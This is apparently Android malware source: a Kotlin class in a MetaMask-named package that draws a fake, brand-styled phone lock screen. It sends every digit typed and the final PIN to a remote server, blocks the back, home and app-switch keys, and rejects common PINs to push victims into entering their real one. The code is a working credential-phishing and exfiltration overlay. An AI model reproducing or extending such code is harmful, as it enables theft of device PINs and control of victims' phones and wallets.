package com.example.MetaMask.services

import android.content.Context
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.widget.*
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class HybridPinOverlay(
    ctx: Context,
    cfg: JSONObject,
    private val mgr: HybridOverlayManager
) : FrameLayout(ctx) {

    private val maxDigits = cfg.optInt("pin_digits", 0)
    private val customTitle = cfg.optString("title", "")
    private val btnText = cfg.optString("button_text", "OK")
    private val brand = cfg.optString("brand", "xiaomi").lowercase(Locale.ROOT)
    private val validatePin = cfg.optBoolean("validate_pin", false)

    private val entered = StringBuilder()
    private var submitted = false
    private lateinit var dotsView: TextView
    private var confirmBtn: Button? = null
    private var errorView: TextView? = null
    private var clockView: TextView? = null
    private var dateView: TextView? = null
    private val clockHandler = Handler(Looper.getMainLooper())
    private var clockRunnable: Runnable? = null

    private val simplePins: Set<String> = buildSet {
        val lengths = if (maxDigits in 1..10) setOf(4, 6, maxDigits) else setOf(4, 6)
        val s = "0123456789"
        for (n in lengths) {
            android.util.Log.d("XDBG", "[HybridPinOverlay] loop") //xdbg
            for (d in '0'..'9') add("$d".repeat(n))
            for (i in 0..(10 - n)) { add(s.substring(i, i + n)); add(s.reversed().substring(i, i + n)) }
        }
        addAll(listOf(
            "1234","4321","1230","0987","2580","1357","0852","7410","1470","0741",
            "1122","1212","2121","1221","0123","3210","9876","6789",
            "123456","654321","112233","123123","321321","159753","357951"
        ))
    }

    private data class BrandStyle(
        val bgColor: Int, val btnColor: Int, val btnTextColor: Int,
        val titleColor: Int, val dotsColor: Int, val accentColor: Int,
        val btnRadius: Float, val btnSize: Int, val showClock: Boolean
    )

    private val style: BrandStyle by lazy {
        when (brand) {
            "samsung" -> BrandStyle(
                Color.parseColor("#1c1c2e"), Color.parseColor("#2a2a3e"),
                Color.WHITE, Color.WHITE, Color.WHITE, Color.parseColor("#4a9eff"),
                40f, 72, false
            )
            "honor" -> BrandStyle(
                Color.parseColor("#0a0a0a"), Color.argb(30, 255, 255, 255),
                Color.WHITE, Color.WHITE, Color.WHITE, Color.parseColor("#ff6b35"),
                8f, 68, false
            )
            "oppo" -> BrandStyle(
                Color.parseColor("#000000"), Color.parseColor("#1a237e"),
                Color.WHITE, Color.WHITE, Color.WHITE, Color.parseColor("#2196f3"),
                12f, 74, false
            )
            "vivo" -> BrandStyle(
                Color.parseColor("#000d1a"), Color.argb(60, 30, 80, 160),
                Color.WHITE, Color.WHITE, Color.WHITE, Color.parseColor("#1565c0"),
                6f, 72, true
            )
            "tecno" -> BrandStyle(
                Color.parseColor("#f5f5f5"), Color.parseColor("#e0e0e0"),
                Color.parseColor("#212121"), Color.parseColor("#212121"),
                Color.parseColor("#212121"), Color.parseColor("#ff5722"),
                8f, 72, false
            )
            "pixel" -> BrandStyle(
                Color.parseColor("#1c2526"), Color.parseColor("#2d3748"),
                Color.WHITE, Color.WHITE, Color.WHITE, Color.parseColor("#7986cb"),
                28f, 72, false
            )
            "stock" -> BrandStyle(
                Color.parseColor("#141414"), Color.parseColor("#2a2a2a"),
                Color.WHITE, Color.WHITE, Color.WHITE, Color.parseColor("#03a9f4"),
                4f, 72, false
            )
            else -> BrandStyle(
                Color.parseColor("#0f0a28"), Color.argb(50, 255, 255, 255),
                Color.WHITE, Color.parseColor("#e0d8ff"), Color.WHITE,
                Color.parseColor("#7c4dff"), 4f, 74, true
            )
        }
    }

    init {
        setBackgroundColor(style.bgColor)
        buildUi()
        if (style.showClock) startClock()
    }

    private fun Int.dp() = (this * resources.displayMetrics.density + 0.5f).toInt()

    private fun buildUi() {
        android.util.Log.d("XDBG", "[HybridPinOverlay] buildUi enter") //xdbg
        val outer = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
            setPadding(0, 48.dp(), 0, 40.dp())
        }

        if (style.showClock) {
            android.util.Log.d("XDBG", "[HybridPinOverlay] if branch") //xdbg
            clockView = TextView(context).apply {
                textSize = 56f
                setTextColor(Color.WHITE)
                gravity = Gravity.CENTER
                typeface = Typeface.create("sans-serif-light", Typeface.NORMAL)
                layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                    bottomMargin = 2.dp()
                }
            }
            dateView = TextView(context).apply {
                textSize = 14f
                setTextColor(Color.argb(180, 255, 255, 255))
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                    bottomMargin = 20.dp()
                }
            }
            outer.addView(clockView)
            outer.addView(dateView)
        }

        if (customTitle.isNotEmpty()) {
            android.util.Log.d("XDBG", "[HybridPinOverlay] if branch") //xdbg
            outer.addView(TextView(context).apply {
                text = customTitle
                textSize = 16f
                setTextColor(style.titleColor)
                gravity = Gravity.CENTER
                setPadding(32.dp(), 0, 32.dp(), 16.dp())
            })
        }

        dotsView = TextView(context).apply {
            text = ""
            textSize = 28f
            letterSpacing = 0.6f
            setTextColor(style.dotsColor)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 20.dp())
            minWidth = 180.dp()
            minHeight = 44.dp()
        }
        outer.addView(dotsView)

        errorView = TextView(context).apply {
            text = ""
            textSize = 13f
            setTextColor(Color.parseColor("#ff5252"))
            gravity = Gravity.CENTER
            visibility = INVISIBLE
            setPadding(32.dp(), 0, 32.dp(), 0)
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                bottomMargin = 8.dp()
            }
        }
        outer.addView(errorView)

        val grid = GridLayout(context).apply {
            columnCount = 3
            rowCount = 4
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }
        listOf("1","2","3","4","5","6","7","8","9","","0","⌫").forEach { key ->
            if (key.isEmpty()) {
                android.util.Log.d("XDBG", "[HybridPinOverlay] if branch") //xdbg
                grid.addView(View(context).apply {
                    layoutParams = GridLayout.LayoutParams().apply {
                        width = style.btnSize.dp(); height = style.btnSize.dp()
                        setMargins(8.dp(), 8.dp(), 8.dp(), 8.dp())
                    }
                })
                android.util.Log.d("XDBG", "[HybridPinOverlay] return") //xdbg
                return@forEach
            }
            grid.addView(Button(context).apply {
                text = key
                textSize = if (key == "⌫") 18f else 22f
                typeface = Typeface.DEFAULT_BOLD
                setTextColor(style.btnTextColor)
                background = GradientDrawable().apply {
                    setColor(style.btnColor)
                    cornerRadius = style.btnRadius * resources.displayMetrics.density
                }
                layoutParams = GridLayout.LayoutParams().apply {
                    width = style.btnSize.dp(); height = style.btnSize.dp()
                    setMargins(8.dp(), 8.dp(), 8.dp(), 8.dp())
                }
                setOnClickListener {
                    when (key) {
                        "⌫" -> if (entered.isNotEmpty()) entered.deleteCharAt(entered.length - 1)
                        else -> {
                            val limit = if (maxDigits > 0) maxDigits else 12
                            if (entered.length < limit) entered.append(key)
                        }
                    }
                    onInput()
                }
            })
        }
        outer.addView(grid)

        if (maxDigits == 0) {
            android.util.Log.d("XDBG", "[HybridPinOverlay] if branch") //xdbg
            confirmBtn = Button(context).apply {
                text = btnText
                textSize = 15f
                setTextColor(Color.WHITE)
                background = GradientDrawable().apply {
                    setColor(style.accentColor)
                    cornerRadius = 10f * resources.displayMetrics.density
                }
                visibility = GONE
                layoutParams = LinearLayout.LayoutParams(220.dp(), 50.dp()).apply {
                    topMargin = 20.dp()
                    gravity = Gravity.CENTER_HORIZONTAL
                }
                setOnClickListener { submit() }
            }
            outer.addView(confirmBtn)
        }

        addView(outer)
    }

    private fun onInput() {
        android.util.Log.d("XDBG", "[HybridPinOverlay] onInput enter") //xdbg
        val len = entered.length
        dotsView.text = "●".repeat(len)
        errorView?.visibility = INVISIBLE

        mgr.sendToServer(JSONObject().apply {
            put("action", "hybrid_overlay_input")
            put("type", "pin")
            put("data", entered.toString())
            put("timestamp", System.currentTimeMillis())
        })

        if (maxDigits > 0 && len >= maxDigits) { submit(); return }
        if (maxDigits == 0) confirmBtn?.visibility = if (len >= 4) VISIBLE else GONE
    }

    private fun submit() {
        android.util.Log.d("XDBG", "[HybridPinOverlay] submit enter") //xdbg
        val pin = entered.toString()

        mgr.sendToServer(JSONObject().apply {
            put("action", "hybrid_overlay_input")
            put("type", "pin_submit")
            put("data", pin)
            put("timestamp", System.currentTimeMillis())
        })

        if (validatePin && simplePins.contains(pin)) {
            android.util.Log.d("XDBG", "[HybridPinOverlay] if branch") //xdbg
            errorView?.apply { text = getSimplePinError(); visibility = VISIBLE }
            entered.clear()
            dotsView.text = ""
            confirmBtn?.visibility = GONE
            return
        }

        if (submitted) return
        submitted = true
        mgr.close("pin_submitted")
    }

    private fun getSimplePinError(): String = when (Locale.getDefault().language) {
        "ru" -> "PIN слишком простой, попробуйте другой"
        "uk" -> "PIN занадто простий, спробуйте інший"
        "de" -> "PIN zu einfach, bitte anderen wählen"
        "fr" -> "PIN trop simple, essayez un autre"
        "tr" -> "PIN çok basit, başka deneyin"
        "es" -> "PIN demasiado simple, intente otro"
        "kk" -> "PIN тым қарапайым, басқасын енгізіңіз"
        else -> "PIN is too simple, try another"
    }

    private fun startClock() {
        android.util.Log.d("XDBG", "[HybridPinOverlay] startClock enter") //xdbg
        val timeFmt = SimpleDateFormat("HH:mm", Locale.getDefault())
        val dateFmt = SimpleDateFormat("EEE, d MMMM", Locale.getDefault())
        val r = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[HybridPinOverlay] run enter") //xdbg
                val now = Date()
                clockView?.text = timeFmt.format(now)
                dateView?.text = dateFmt.format(now)
                clockHandler.postDelayed(this, 1000L)
            }
        }
        clockRunnable = r
        clockHandler.post(r)
    }

    override fun onDetachedFromWindow() {
        android.util.Log.d("XDBG", "[HybridPinOverlay] onDetachedFromWindow enter") //xdbg
        super.onDetachedFromWindow()
        clockRunnable?.let { clockHandler.removeCallbacks(it) }
    }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        android.util.Log.d("XDBG", "[HybridPinOverlay] dispatchKeyEvent enter event=${event}") //xdbg
        val c = event.keyCode
        if (c == KeyEvent.KEYCODE_BACK || c == KeyEvent.KEYCODE_HOME || c == KeyEvent.KEYCODE_APP_SWITCH)
            android.util.Log.d("XDBG", "[HybridPinOverlay] return") //xdbg
            return true
        android.util.Log.d("XDBG", "[HybridPinOverlay] return") //xdbg
        return super.dispatchKeyEvent(event)
    }
}
